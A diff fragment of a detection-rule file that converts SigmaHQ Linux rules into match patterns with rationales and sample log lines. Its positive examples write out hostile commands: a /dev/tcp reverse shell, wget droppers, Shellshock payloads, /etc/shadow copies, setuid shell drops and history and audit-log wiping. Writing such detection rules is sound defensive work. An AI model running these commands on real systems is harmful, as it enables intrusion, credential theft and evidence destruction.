+      - 'Nov 20 13:01:00 sol01 genunix: [ID 540533 kern.notice] SunOS Release 5.10 Version Generic'
+      - 'Nov 20 13:02:00 web01 kernel: [ 33.1] NX (Execute Disable) protection: active'
+
+- id: mention.sigma_buffer_overflow_weak
+  title: Crash and padding messages (Sigma "Buffer Overflow Attempts", noisy keywords)
+  match:
+    literal:
+      - 'stack smashing detected'
+      - 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+  case_sensitive: false
+  strength: weak
+  attack: [T1068, T1190]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Buffer Overflow Attempts (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_buffer_overflows.yml
+    license: DRL-1.1
+    upstream_id: 18b042f0-2ecd-4b6e-9f8d-aa7a7e7de781
+  rationale: >-
+    A glibc stack-protector abort and a long run of 'A' padding accompany overflow attempts, but buggy programs abort
+    the same way and base64 data contains long 'A' runs (the rule itself lists base64 as a false positive).
+  examples:
+    positive:
+      - 'Nov 20 13:03:00 web01 kernel: *** stack smashing detected ***: terminated (snmpd[2211])'
+    negative:
+      - 'Nov 20 13:04:00 web01 snmpd[2211]: Received SNMP packet(s) from UDP: [10.0.0.4]:161'
+      - 'Nov 20 13:05:00 web01 kernel: [ 44.0] traps: app[900] general protection fault ip:7f00 sp:7ffd error:0'
+
+- id: mention.sigma_equationgroup_strings
+  title: Equation Group tool command strings (Sigma "Equation Group Indicators")
+  match:
+    literal:
+      - 'cp /bin/sh .;chown'
+      - 'chmod 4777 /tmp/.scsi/dev/bin/gsh'
+      - 'chown root:root /tmp/.scsi/dev/bin/'
+      - 'chown root:root x;'
+      - '/bin/telnet locip locport < /dev/console | /bin/sh'
+      - '/tmp/ratload'
+      - 'cat > /dev/tcp/127.0.0.1/80 <<END'
+      - 'rm -f /current/tmp/ftshell.latest'
+      - '> /var/log/audit/audit.log; rm -f .'
+      - 'cp /var/log/audit/audit.log .tmp'
+      - '< /dev/console | uudecode && uncompress'
+      - 'sendmail -osendmail;chmod +x sendmail'
+      - 'chmod 666 /var/run/utmp~'
+      - 'chmod 700 nscd crond'
+      - 'cp /etc/shadow /tmp/.'
+      - '</dev/console |uudecode > /dev/null 2>&1 && uncompress'
+      - 'chmod 700 jp&&netstat -an|grep'
+      - 'chmod 700 fp sendmail pt'
+      - 'chmod 755 /usr/vmsys/bin/pipe'
+      - 'chmod -R 755 /usr/vmsys'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1548.001, T1685.006, T1003.008]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Equation Group Indicators (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_apt_equationgroup_lnx.yml
+    license: DRL-1.1
+    upstream_id: 41e5c73d-9983-4b69-bd03-e13b67e9623c
+  rationale: >-
+    Exact command fragments from the leaked Equation Group Unix toolset (setuid shell drops, audit log wiping,
+    shadow file copies, uudecode droppers from /dev/console). They are tool-specific and do not occur in routine
+    administration. Wildcard keywords are separate anchored entries; 'ghost_* -v ', the packrat netcat listeners,
+    'uudecode ... uncompress -f', '$opbin/*tunnel' and '&& telnet * </dev/console' were left out as too generic or
+    of little value today.
+  examples:
+    positive:
+      - 'Nov 20 13:06:00 sun02 bash[611]: HISTORY: cp /etc/shadow /tmp/.; ls -la /tmp'
+      - 'Nov 20 13:07:00 sun02 bash[612]: HISTORY: > /var/log/audit/audit.log; rm -f .bash_history'
+      - 'Nov 21 09:00:50 sun02 bash[4100]: HISTORY: cp /bin/sh .;chown'
+      - 'Nov 21 09:00:51 sun02 bash[4100]: HISTORY: chmod 4777 /tmp/.scsi/dev/bin/gsh'
+      - 'Nov 21 09:00:52 sun02 bash[4100]: HISTORY: chown root:root /tmp/.scsi/dev/bin/'
+      - 'Nov 21 09:00:53 sun02 bash[4100]: HISTORY: chown root:root x;'
+      - 'Nov 21 09:00:54 sun02 bash[4100]: HISTORY: /bin/telnet locip locport < /dev/console | /bin/sh'
+      - 'Nov 21 09:00:55 sun02 bash[4100]: HISTORY: /tmp/ratload'
+      - 'Nov 21 09:00:56 sun02 bash[4100]: HISTORY: cat > /dev/tcp/127.0.0.1/80 <<END'
+      - 'Nov 21 09:00:57 sun02 bash[4100]: HISTORY: rm -f /current/tmp/ftshell.latest'
+      - 'Nov 21 09:00:58 sun02 bash[4100]: HISTORY: cp /var/log/audit/audit.log .tmp'
+      - 'Nov 21 09:00:59 sun02 bash[4100]: HISTORY: < /dev/console | uudecode && uncompress'
+      - 'Nov 21 09:01:00 sun02 bash[4100]: HISTORY: sendmail -osendmail;chmod +x sendmail'
+      - 'Nov 21 09:01:01 sun02 bash[4100]: HISTORY: chmod 666 /var/run/utmp~'
+      - 'Nov 21 09:01:02 sun02 bash[4100]: HISTORY: chmod 700 nscd crond'
+      - 'Nov 21 09:01:03 sun02 bash[4100]: HISTORY: </dev/console |uudecode > /dev/null 2>&1 && uncompress'
+      - 'Nov 21 09:01:04 sun02 bash[4100]: HISTORY: chmod 700 jp&&netstat -an|grep'
+      - 'Nov 21 09:01:05 sun02 bash[4100]: HISTORY: chmod 700 fp sendmail pt'
+      - 'Nov 21 09:01:06 sun02 bash[4100]: HISTORY: chmod 755 /usr/vmsys/bin/pipe'
+      - 'Nov 21 09:01:07 sun02 bash[4100]: HISTORY: chmod -R 755 /usr/vmsys'
+    negative:
+      - 'Nov 20 13:08:00 sun02 bash[613]: HISTORY: cp /etc/hosts /tmp/hosts.bak'
+      - 'Nov 20 13:09:00 sun02 auditd[455]: Audit daemon rotating log files'
+
+- id: mention.sigma_equationgroup_generic
+  title: 'Equation Group fragments with generic words (Sigma "Equation Group Indicators")'
+  match:
+    literal: ['ewok -t ', 'xspy -display ', ' --wipe > /dev/null', 'chmod 700 crond', 'chmod 700 sendmail', 'chmod 0700 sendmail']
+  case_sensitive: false
+  strength: medium
+  attack: [T1059.004]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Equation Group Indicators (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_apt_equationgroup_lnx.yml
+    license: DRL-1.1
+    upstream_id: 41e5c73d-9983-4b69-bd03-e13b67e9623c
+  rationale: >-
+    These fragments name Equation Group tools (ewok, xspy) or masquerade them as daemons (crond, sendmail), but the
+    words are generic enough that unrelated scripts can produce them, so they are medium.
+  examples:
+    positive:
+      - 'Nov 20 13:10:00 sun02 bash[614]: HISTORY: ./ewok -t 198.51.100.3'
+    negative:
+      - 'Nov 20 13:11:00 sun02 bash[615]: HISTORY: chmod 755 /etc/init.d/crond'
+      - 'Nov 20 13:12:00 sun02 bash[616]: HISTORY: shred -u secrets.txt'
+
+- id: mention.sigma_equationgroup_setuid_root
+  title: chown root then chmod 4777 (Sigma "Equation Group Indicators")
+  match:
+    anchored: 'chown root[^\n]{0,200}chmod 4777 '
+  case_sensitive: false
+  strength: strong
+  attack: [T1548.001]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Equation Group Indicators (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_apt_equationgroup_lnx.yml
+    license: DRL-1.1
+    upstream_id: 41e5c73d-9983-4b69-bd03-e13b67e9623c
+  rationale: >-
+    Translation of 'chown root*chmod 4777 '. Giving a file to root and then making it setuid and world-writable is
+    the setuid-shell drop of the evolvingstrategy and elgingamble tools; no package sets mode 4777.
+  examples:
+    positive:
+      - 'Nov 20 13:13:00 sun02 bash[617]: HISTORY: chown root:root sh; chmod 4777 sh'
+    negative:
+      - 'Nov 20 13:14:00 sun02 bash[618]: HISTORY: chown root:root /etc/cron.d/backup; chmod 644 /etc/cron.d/backup'
+      - 'Nov 20 13:15:00 sun02 bash[619]: HISTORY: chmod 4755 /usr/bin/passwd'
+
+- id: mention.sigma_equationgroup_noclient_arp
+  title: noclient ARP sweep fragment (Sigma "Equation Group Indicators")
+  match:
+    anchored: 'ping -c 2 [^\n]{1,100}; grep [^\n]{1,100} /proc/net/arp >/tmp/gx'
+  case_sensitive: false
+  strength: strong
+  attack: [T1018]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Equation Group Indicators (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_apt_equationgroup_lnx.yml
+    license: DRL-1.1
+    upstream_id: 41e5c73d-9983-4b69-bd03-e13b67e9623c
+  rationale: >-
+    Translation of 'ping -c 2 *; grep * /proc/net/arp >/tmp/gx'. The fixed output file /tmp/gx is specific to the
+    noclient tooling; administrators do not write ARP lookups there.
+  examples:
+    positive:
+      - 'Nov 20 13:16:00 sun02 sh[620]: ping -c 2 10.0.0.9; grep 10.0.0.9 /proc/net/arp >/tmp/gx'
+    negative:
+      - 'Nov 20 13:17:00 sun02 bash[621]: HISTORY: ping -c 2 10.0.0.9; ip neigh show'
+      - 'Nov 20 13:18:00 sun02 bash[622]: HISTORY: grep 10.0.0.9 /proc/net/arp'
+
+- id: mention.sigma_equationgroup_rst_drop
+  title: noclient RST drop rule (Sigma "Equation Group Indicators")
+  match:
+    anchored: 'iptables [^\n]{1,60} OUTPUT -p tcp -d 127\.0\.0\.1 --tcp-flags RST RST -j DROP;'
+  case_sensitive: false
+  strength: strong
+  attack: [T1686]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Equation Group Indicators (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_apt_equationgroup_lnx.yml
+    license: DRL-1.1
+    upstream_id: 41e5c73d-9983-4b69-bd03-e13b67e9623c
+  rationale: >-
+    Translation of 'iptables * OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;'. Dropping locally generated
+    resets toward loopback lets a raw-socket implant hold connections; firewall management tools do not emit it.
+  examples:
+    positive:
+      - 'Nov 20 13:19:00 sun02 sh[623]: iptables -I OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP; ./nc'
+    negative:
+      - 'Nov 20 13:20:00 sun02 bash[624]: HISTORY: iptables -A INPUT -p tcp --dport 22 -j ACCEPT'
+      - 'Nov 20 13:21:00 sun02 bash[625]: HISTORY: iptables -L OUTPUT -n'
+
+- id: mention.sigma_equationgroup_dev_tcp_shell
+  title: 'sh with output to /dev/tcp (Sigma "Equation Group Indicators")'
+  match:
+    anchored: 'sh >/dev/tcp/[^\n]{1,100} <&1 2>&1'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Equation Group Indicators (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_apt_equationgroup_lnx.yml
+    license: DRL-1.1
+    upstream_id: 41e5c73d-9983-4b69-bd03-e13b67e9623c
+  rationale: >-
+    Translation of 'sh >/dev/tcp/* <&1 2>&1': a shell whose output, input and errors all go to a TCP socket, which is
+    a reverse shell.
+  examples:
+    positive:
+      - 'Nov 20 13:22:00 sun02 sh[626]: sh >/dev/tcp/198.51.100.3/53 <&1 2>&1'
+    negative:
+      - 'Nov 20 13:23:00 sun02 bash[627]: HISTORY: sh ./backup.sh >/var/log/backup.log 2>&1'
+      - 'Nov 20 13:24:00 sun02 bash[628]: HISTORY: bash -c "echo > /dev/tcp/10.0.0.2/22"'
+
+- id: mention.sigma_equationgroup_wget_cron
+  title: echowrecker download to /tmp/a then chmod /tmp/cron (Sigma "Equation Group Indicators")
+  match:
+    anchored: '/usr/bin/wget -O /tmp/a http[^\n]{0,200} && chmod 755 /tmp/cron'
+  case_sensitive: false
+  strength: strong
+  attack: [T1105, T1036.005]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Equation Group Indicators (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_apt_equationgroup_lnx.yml
+    license: DRL-1.1
+    upstream_id: 41e5c73d-9983-4b69-bd03-e13b67e9623c
+  rationale: >-
+    Translation of '/usr/bin/wget -O /tmp/a http* && chmod 755 /tmp/cron': a download into /tmp followed by making a
+    daemon-named file executable, a tool-specific dropper sequence.
+  examples:
+    positive:
+      - 'Nov 20 13:25:00 sun02 sh[629]: /usr/bin/wget -O /tmp/a http://198.51.100.3/a && chmod 755 /tmp/cron'
+    negative:
+      - 'Nov 20 13:26:00 sun02 bash[630]: HISTORY: /usr/bin/wget -O /tmp/a https://mirror.example.org/a.iso'
+      - 'Nov 20 13:27:00 sun02 bash[631]: HISTORY: chmod 755 /usr/local/sbin/cron-report'
+
+- id: mention.sigma_equationgroup_wget_sendmail
+  title: 'wget of a sendmail file with chmod +x (Sigma "Equation Group Indicators")'
+  match:
+    anchored: 'wget http[^\n]{0,200}sendmail; ?chmod \+x (?:/tmp/)?sendmail'
+  case_sensitive: false
+  strength: strong
+  attack: [T1105, T1036.005]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Equation Group Indicators (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_apt_equationgroup_lnx.yml
+    license: DRL-1.1
+    upstream_id: 41e5c73d-9983-4b69-bd03-e13b67e9623c
+  rationale: >-
+    Combined translation of 'wget http*; chmod +x /tmp/sendmail' and '/usr/bin/wget http*sendmail;chmod +x sendmail;':
+    fetching a file named sendmail over HTTP and making it executable masquerades an implant as the mail daemon.
+  examples:
+    positive:
+      - 'Nov 20 13:28:00 sun02 sh[632]: /usr/bin/wget http://198.51.100.3/sendmail;chmod +x sendmail;./sendmail'
+      - 'Nov 20 13:29:00 sun02 sh[633]: wget http://198.51.100.3/x -O /tmp/sendmail; chmod +x /tmp/sendmail'
+    negative:
+      - 'Nov 20 13:30:00 sun02 bash[634]: HISTORY: dnf install sendmail; systemctl enable sendmail'
+      - 'Nov 20 13:31:00 sun02 bash[635]: HISTORY: wget https://mirror.example.org/sendmail.mc.example'
+
+- id: mention.sigma_history_null_redirect
+  title: 'cat /dev/null or /dev/zero into a shell history file (Sigma "Linux Command History Tampering")'
+  match:
+    anchored: 'cat /dev/(?:null|zero) >[^\n]{0,100}sh_history'
+  case_sensitive: false
+  strength: strong
+  attack: [T1070.003]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Linux Command History Tampering (Patrick Bareiss)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_clear_cmd_history.yml
+    license: DRL-1.1
+    upstream_id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e
+  rationale: >-
+    Translation of 'cat /dev/null >*sh_history' and 'cat /dev/zero >*sh_history'. Emptying a shell history file is
+    anti-forensics; administrators who want a clean history use HISTCONTROL rather than wiping the file.
+  examples:
+    positive:
+      - 'Nov 20 13:32:00 web01 bash[636]: HISTORY: cat /dev/null > ~/.bash_history && exit'
+    negative:
+      - 'Nov 20 13:33:00 web01 bash[637]: HISTORY: cat /dev/null > /var/log/app/debug.log'
+      - 'Nov 20 13:34:00 web01 bash[638]: HISTORY: tail -n 50 ~/.bash_history'
+
+- id: mention.sigma_history_symlink_null
+  title: 'ln -sf /dev/null onto a shell history file (Sigma "Linux Command History Tampering")'
+  match:
+    anchored: 'ln -sf /dev/(?:null|zero) [^\n]{0,100}sh_history'
+  case_sensitive: false
+  strength: strong
+  attack: [T1070.003, T1690]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Linux Command History Tampering (Patrick Bareiss)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_clear_cmd_history.yml
+    license: DRL-1.1
+    upstream_id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e
+  rationale: >-
+    Translation of 'ln -sf /dev/null *sh_history' and the /dev/zero variant. Linking the history file to /dev/null
+    silently stops history from being kept, a persistent anti-forensic setting seen in intrusion kits.
+  examples:
+    positive:
+      - 'Nov 20 13:35:00 web01 bash[639]: HISTORY: ln -sf /dev/null /root/.bash_history'
+    negative:
+      - 'Nov 20 13:36:00 web01 bash[640]: HISTORY: ln -sf /opt/app/current /opt/app/live'
+      - 'Nov 20 13:37:00 web01 bash[641]: HISTORY: ls -l ~/.zsh_history'
+
+- id: mention.sigma_history_chattr
+  title: 'chattr +i on a shell history file (Sigma "Linux Command History Tampering")'
+  match:
+    anchored: 'chattr \+i[^\n]{0,100}sh_history'
+  case_sensitive: false
+  strength: strong
+  attack: [T1070.003, T1690]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Linux Command History Tampering (Patrick Bareiss)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_clear_cmd_history.yml
+    license: DRL-1.1
+    upstream_id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e
+  rationale: >-
+    Translation of 'chattr +i*sh_history'. An immutable (usually emptied) history file cannot record new commands;
+    there is no administrative reason to freeze it.
+  examples:
+    positive:
+      - 'Nov 20 13:38:00 web01 bash[642]: HISTORY: chattr +i /root/.bash_history'
+    negative:
+      - 'Nov 20 13:39:00 web01 bash[643]: HISTORY: chattr +i /etc/resolv.conf'
+      - 'Nov 20 13:40:00 web01 bash[644]: HISTORY: lsattr /root/.bash_history'
+
+- id: mention.sigma_history_echo_empty
+  title: 'echo "" into a shell history file (Sigma "Linux Command History Tampering")'
+  match:
+    anchored: 'echo "" >[^\n]{0,100}sh_history'
+  case_sensitive: false
+  strength: strong
+  attack: [T1070.003]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Linux Command History Tampering (Patrick Bareiss)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_clear_cmd_history.yml
+    license: DRL-1.1
+    upstream_id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e
+  rationale: >-
+    Translation of 'echo "" >*sh_history'. Overwriting the history file with an empty string erases the record of what
+    was typed in the session.
+  examples:
+    positive:
+      - 'Nov 20 13:41:00 web01 bash[645]: HISTORY: echo "" > /home/www/.bash_history'
+    negative:
+      - 'Nov 20 13:42:00 web01 bash[646]: HISTORY: echo "" > /tmp/empty.txt'
+      - 'Nov 20 13:43:00 web01 bash[647]: HISTORY: echo "export HISTSIZE=5000" >> ~/.bashrc'
+
+- id: mention.sigma_history_shred
+  title: 'shred of a shell history file (Sigma "Linux Command History Tampering")'
+  match:
+    anchored: 'shred [^\n]{0,100}sh_history'
+  case_sensitive: false
+  strength: strong
+  attack: [T1070.003, T1070.004]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Linux Command History Tampering (Patrick Bareiss)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_clear_cmd_history.yml
+    license: DRL-1.1
+    upstream_id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e
+  rationale: >-
+    Translation of 'shred *sh_history'. Securely overwriting a history file defeats recovery; it is anti-forensics,
+    not housekeeping.
+  examples:
+    positive:
+      - 'Nov 20 13:44:00 web01 bash[648]: HISTORY: shred -zu ~/.bash_history'
+    negative:
+      - 'Nov 20 13:45:00 web01 bash[649]: HISTORY: shred -u /tmp/old-key.pem'
+      - 'Nov 20 13:46:00 web01 bash[650]: HISTORY: wc -l ~/.bash_history'
+
+- id: mention.sigma_history_truncate
+  title: 'truncate -s0 of a shell history file (Sigma "Linux Command History Tampering")'
+  match:
+    anchored: 'truncate -s0 [^\n]{0,100}sh_history'
+  case_sensitive: false
+  strength: strong
+  attack: [T1070.003]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Linux Command History Tampering (Patrick Bareiss)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_clear_cmd_history.yml
+    license: DRL-1.1
+    upstream_id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e
+  rationale: >-
+    Translation of 'truncate -s0 *sh_history'. Truncating the history file to zero bytes erases the session record.
+  examples:
+    positive:
+      - 'Nov 20 13:47:00 web01 bash[651]: HISTORY: truncate -s0 /root/.bash_history'
+    negative:
+      - 'Nov 20 13:48:00 web01 bash[652]: HISTORY: truncate -s0 /var/log/app/huge.log'
+      - 'Nov 20 13:49:00 web01 bash[653]: HISTORY: truncate -s 10G /srv/disk.img'
+
+- id: mention.sigma_history_rm_inline
+  title: 'rm of a shell history file, mid-line (Sigma "Linux Command History Tampering")'
+  match:
+    anchored: ' rm [^\n]{0,100}sh_history'
+  case_sensitive: false
+  strength: medium
+  attack: [T1070.003, T1070.004]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Linux Command History Tampering (Patrick Bareiss)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_clear_cmd_history.yml
+    license: DRL-1.1
+    upstream_id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e
+  rationale: >-
+    Translation of 'rm *sh_history' where the command follows other text on the line (a log prefix or a preceding
+    command). Deleting history is anti-forensics, but users occasionally remove their own history, so it is medium.
+    A second entry covers a line that starts with rm.
+  examples:
+    positive:
+      - 'Nov 20 13:50:00 web01 bash[654]: HISTORY: rm -f ~/.bash_history; exit'
+    negative:
+      - 'Nov 20 13:51:00 web01 bash[655]: HISTORY: rm -f /tmp/build.log'
+      - 'Nov 20 13:52:00 web01 bash[656]: HISTORY: cp ~/.bash_history /backup/'
+
+- id: mention.sigma_history_rm_line_start
+  title: 'rm of a shell history file, line start (Sigma "Linux Command History Tampering")'
+  match:
+    anchored: '^rm [^\n]{0,100}sh_history'
+  case_sensitive: false
+  strength: medium
+  attack: [T1070.003, T1070.004]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Linux Command History Tampering (Patrick Bareiss)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_clear_cmd_history.yml
+    license: DRL-1.1
+    upstream_id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e
+  rationale: >-
+    Translation of 'rm *sh_history' for text that starts with the command, as in raw history files or command-only
+    log fields. Same reasoning as the mid-line entry.
+  examples:
+    positive:
+      - 'rm -rf /root/.bash_history /root/.zsh_history'
+    negative:
+      - 'rm -rf /tmp/build-cache'
+      - 'mv ~/.bash_history ~/.bash_history.old'
+
+- id: mention.sigma_history_disable
+  title: 'History-off settings text (Sigma "Linux Command History Tampering")'
+  match:
+    literal: ['empty_bash_history', 'export HISTFILESIZE=0', 'shopt -ou history', 'shopt -uo history']
+  case_sensitive: false
+  strength: strong
+  attack: [T1690, T1070.003]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Linux Command History Tampering (Patrick Bareiss)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_clear_cmd_history.yml
+    license: DRL-1.1
+    upstream_id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e
+  rationale: >-
+    Setting the history file size to zero or turning the bash history option off stops the session from being
+    recorded; the strings come from intrusion kits and campaign reports the rule cites. 'unset HISTFILE' is
+    commented out upstream as false-positive prone and is not imported.
+  examples:
+    positive:
+      - 'Nov 20 13:53:00 web01 bash[657]: HISTORY: export HISTFILESIZE=0; export HISTSIZE=0'
+      - 'Nov 21 09:01:08 web01 bash[4100]: HISTORY: empty_bash_history'
+      - 'Nov 21 09:01:09 web01 bash[4100]: HISTORY: shopt -ou history; cd /tmp'
+      - 'Nov 21 09:01:10 web01 bash[4100]: HISTORY: shopt -uo history; cd /tmp'
+    negative:
+      - 'Nov 20 13:54:00 web01 bash[658]: HISTORY: export HISTFILESIZE=100000'
+      - 'Nov 20 13:55:00 web01 bash[659]: HISTORY: shopt -s histappend'
+
+- id: mention.sigma_history_clear_builtin
+  title: 'history -c or history -w text (Sigma "Linux Command History Tampering", noisy keywords)'
+  match:
+    literal: ['history -c', 'history -w']
+  case_sensitive: false
+  strength: weak
+  attack: [T1070.003]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Linux Command History Tampering (Patrick Bareiss)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_clear_cmd_history.yml
+    license: DRL-1.1
+    upstream_id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e
+  rationale: >-
+    'history -c' clears the in-memory history and 'history -w' rewrites the file; users run both for ordinary
+    reasons (shared terminals, syncing tmux panes), so they are weak candidates.
+  examples:
+    positive:
+      - 'Nov 20 13:56:00 web01 bash[660]: HISTORY: history -c && exit'
+    negative:
+      - 'Nov 20 13:57:00 web01 bash[661]: HISTORY: history | grep ssh'
+      - 'Nov 20 13:58:00 web01 bash[662]: HISTORY: history 20'
+
+- id: mention.sigma_history_clear_then_exit
+  title: 'history -c then exit or logout on one line (Sigma "Linux Command History Tampering")'
+  match:
+    anchored: 'history -c {0,2}(?:&&|;) {0,2}(?:exit|logout)\b'
+  case_sensitive: false
+  strength: medium
+  attack: [T1070.003]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Linux Command History Tampering (Patrick Bareiss)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_clear_cmd_history.yml
+    license: DRL-1.1
+    upstream_id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e
+  rationale: >-
+    The rule's 'history -c' keyword in its cover-tracks form: clearing the session's history and leaving in the same
+    command. Users clearing a shared terminal usually keep working afterwards, so this form is medium while a bare
+    'history -c' is a weak candidate.
+  examples:
+    positive:
+      - 'Nov 20 13:56:00 web01 bash[660]: HISTORY: history -c && exit'
+    negative:
+      - 'Nov 20 13:57:00 web01 bash[661]: HISTORY: history | grep ssh'
+      - 'Nov 20 13:57:01 web01 bash[662]: HISTORY: history -c; ls -la'
+
+- id: mention.sigma_shellshock
+  title: Shellshock function-definition expression (Sigma "Shellshock Expression")
+  match:
+    literal: ['(){:;};', '() {:;};', '() { :;};', '() { :; };']
+  case_sensitive: false
+  strength: strong
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Shellshock Expression (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shellshock.yml
+    license: DRL-1.1
+    upstream_id: c67e0c98-4d39-46ee-8f6b-437ebf6b950e
+  rationale: >-
+    The empty bash function definition is the CVE-2014-6271 trigger. In web, DHCP or mail logs it is an exploitation
+    attempt (often internet-wide scanning); legitimate traffic never carries it in headers or parameters.
+  examples:
+    positive:
+      - '203.0.113.50 - - [20/Nov/2026:14:00:00 +0000] "GET /cgi-bin/status HTTP/1.1" 404 196 "-" "() { :; }; /bin/bash -c \"wget http://203.0.113.50/x\""'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:11 +0000] "GET /cgi-bin/status HTTP/1.1" 400 0 "-" "(){:;}; /bin/bash -c ''wget http://203.0.113.50/x''"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:12 +0000] "GET /cgi-bin/status HTTP/1.1" 400 0 "-" "() {:;}; /bin/bash -c ''wget http://203.0.113.50/x''"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:13 +0000] "GET /cgi-bin/status HTTP/1.1" 400 0 "-" "() { :;}; /bin/bash -c ''wget http://203.0.113.50/x''"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:14:01:00 +0000] "GET /app.js?v=() HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - 'Nov 20 14:02:00 web01 bash[663]: HISTORY: f() { echo hi; }; f'
+
+- id: mention.sigma_ld_so_preload
+  title: '/etc/ld.so.preload path text (Sigma "Code Injection by ld.so Preload")'
+  match:
+    literal: ['/etc/ld.so.preload']
+  case_sensitive: false
+  strength: medium
+  attack: [T1574.006]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Code Injection by ld.so Preload (Christian Burkard, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_ldso_preload_injection.yml
+    license: DRL-1.1
+    upstream_id: 7e3c4651-c347-40c4-b1d4-d48590fdf684
+  rationale: >-
+    The global preload file is the persistence point of LD_PRELOAD rootkits (Azazel, Jynx, libprocesshider) and
+    cryptominer kits. The loader also names it in its own 'cannot be preloaded' errors and a few vendor agents ship
+    preload libraries, so the mention is medium.
+  examples:
+    positive:
